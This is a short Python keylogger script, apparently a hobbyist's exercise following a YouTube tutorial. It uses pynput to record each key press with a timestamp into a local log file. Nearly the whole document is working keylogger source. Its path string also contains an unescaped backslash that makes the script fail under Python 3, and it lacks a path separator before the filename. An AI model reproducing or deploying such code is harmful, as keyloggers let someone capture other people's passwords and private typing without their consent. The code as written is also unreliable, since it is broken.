#There are many tutorials of this on youtube, so I decided I would try it out for myself and get an introduction to a more standard programming language than a specific one such as powershell. This specific keylogger
#follows David Bombals video and simply records each key press along with the date/time they were pressed.


from pynput.keyboard import Key, Listener
import logging

log_dir = "C:\Users\j\Desktop\Hmm"

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
